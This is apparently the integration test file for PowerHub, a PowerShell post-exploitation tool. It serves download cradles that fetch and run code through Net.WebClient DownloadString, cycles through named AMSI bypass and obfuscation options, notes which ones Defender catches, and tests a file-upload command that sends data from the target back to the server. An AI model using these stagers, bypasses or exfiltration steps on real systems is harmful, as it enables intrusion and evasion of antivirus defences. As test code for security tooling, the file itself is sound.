#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import os
import sys
import time
import tempfile
import re
import random
import requests

import pytest
import bs4

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, BACKENDS, init_tests, execute_cmd  # noqa

log = logging.getLogger(__name__)

MAX_TEST_MODULE_PS1 = 103

init_tests()


def get_stager(**params):
    PORT = '8080'
    i = 0
    if 'transport' not in params:
        # change default transport method because old Windows OS refuse to
        # use TLS1.2 by default
        params['transport'] = 'http'

    # Make 10 attempts
    while i < 10:
        try:
            response = requests.get(
                f"http://{TEST_URI}:{PORT}/dlcradle",
                params=params,
                headers={'Accept': 'text/html'},
            ).text
            soup = bs4.BeautifulSoup(response, features='lxml')
            result = soup.find('code').getText()
            break
        except requests.exceptions.ConnectionError:
            i += 1
            time.sleep(.5)

    result += ';'
    return result


def create_modules():
    func = "function Invoke-Testfunc%(n)d { Write-Host 'Test%(n)d' }"
    from powerhub.directories import directories
    for i in range(MAX_TEST_MODULE_PS1):
        with open(
            os.path.join(directories.MOD_DIR, "psmod%d.ps1" % i),
            "w"
        ) as f:
            f.write(func % {"n": i})


@pytest.fixture(scope="module")
def stager():
    with tempfile.TemporaryDirectory(
        prefix='powerhub_tests',
        ignore_cleanup_errors=True,
    ) as tmpdir:
        os.environ['XDG_DATA_HOME'] = tmpdir

        from powerhub.args import parse_args
        from powerhub.app import PowerHubApp

        args = parse_args([TEST_URI, '--no-auth'])
        app = PowerHubApp(args)
        app.run(background=True)
        create_modules()

        yield get_stager

        app.stop()


def test_stager(stager):
    assert "New-Object Net.WebClient" in stager()
    assert f"DownloadString('https://{TEST_URI}:" in stager(transport='https')
    assert (
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
    ) in stager(transport='https')


@pytest.fixture(scope="module", params=list(BACKENDS.keys()))
def backend(request):
    """Parameterize backends"""
    return BACKENDS[request.param]


def test_start(backend, stager):
    param_set = {
        'default': dict(),
    }

    for amsi_bypass in [
        'reflection',
        'reflection2',
        'rasta-mouse',
        'zc00l',
        'none',
    ]:
        param_set[amsi_bypass] = dict(amsi=amsi_bypass)

    for kex in [
        'oob',
        'embedded',
    ]:
        param_set[kex] = dict(kex=kex)

    for checkbox in [
        'minimal',
        'natural',
        'incremental',
        'obfuscate_setalias',
        'slowenc',
        'useragent',
    ]:
        param_set[checkbox] = {checkbox: 'true'}

    if backend['psversion'] >= 5:
        # These features will produce stagers incompatible with PSv2
        for amsi_bypass in [
            'am0nsec',
            'adam-chester',
        ]:
            param_set[amsi_bypass] = dict(amsi=amsi_bypass)

        param_set['decoy'] = {'decoy': 'true'}
        param_set['dh'] = dict(kex='dh')

    for k, v in param_set.items():
        log.info("Testing param_set %s" % k)
        out = execute_cmd(backend, stager(**v))
        # Some features are known to be caught by defender
        if (
            backend['psversion'] >= 5 and
            'This script contains malicious content' in out and
            ({'zc00l', 'adam-chester', 'none'} & set(v.values()))
        ):
            continue
        assert "Adrian Vollmer" in out
        assert "Run 'Help-PowerHub' for help" in out


def test_preload(backend, stager):
    out = execute_cmd(
        backend,
        stager(preloaded="14,17,20-23,37") + (
            "Invoke-Testfunc14;Invoke-Testfunc17;"
            "Invoke-Testfunc20;Invoke-Testfunc21;"
            "Invoke-Testfunc22;Invoke-Testfunc23;"
            "Invoke-Testfunc37;"
        ),
    )
    for i in [14, 17, 20, 21, 22, 23, 37]:
        assert "Test%d" % i in out


def test_list_hubmodules(backend, stager):
    out = execute_cmd(backend, stager() + "lshm")
    for i in range(MAX_TEST_MODULE_PS1):
        assert "psmod%d" % i in out


def test_load_hubmodule(backend, stager):
    out = execute_cmd(backend, stager() + "ghm psmod53|fl;Invoke-Testfunc53")
    assert "Test53" in out
    assert "psmod53" in out
    assert re.search("Name *: .*psmod53.ps1\r\n", out)
    assert re.search("Type *: ps1\r\n", out)
    assert re.search("N *: 53\r\n", out)
    assert re.search("Loaded *: True\r\n", out)


def test_load_hubmodule_range(backend, stager):
    out = execute_cmd(
        backend,
        stager() + "$p='72-74,77,90-93';ghm $p;"
        "Invoke-Testfunc72;Invoke-Testfunc73;Invoke-Testfunc74;"
        "Invoke-Testfunc77;"
        "Invoke-Testfunc90;Invoke-Testfunc92;Invoke-Testfunc93;"
    )
    assert "Test72" in out
    assert "Test73" in out
    assert "Test74" in out
    assert "Test77" in out
    assert "Test90" in out
    assert "Test93" in out


def test_upload(backend, stager):
    from powerhub.directories import directories
    testfile = "testfile-%030x.dat" % random.randrange(16**30)
    out = execute_cmd(
        backend,
        stager() + (
            '$p=Join-Path $env:TEMP "%s";'
            '[io.file]::WriteAllBytes($p,(1..255));'
            'pth $p;rm $p'
        ) % testfile
    )
    time.sleep(1)
    assert "At line:" not in out  # "At line:" means PS error
    with open(os.path.join(directories.UPLOAD_DIR, testfile), "rb") as f:
        data = f.read()
    assert data == bytes(range(1, 256))

    content = "FooBar123"
    out = execute_cmd(
        backend,
        stager() + "$p='%s';$p|pth -name %s;" % (content, testfile)
    )
    time.sleep(1)
    assert "At line:" not in out  # "At line:" means PS error
    with open(os.path.join(directories.UPLOAD_DIR, testfile+".1"), "r") as f:
        data = f.read()
    assert data.strip() == content
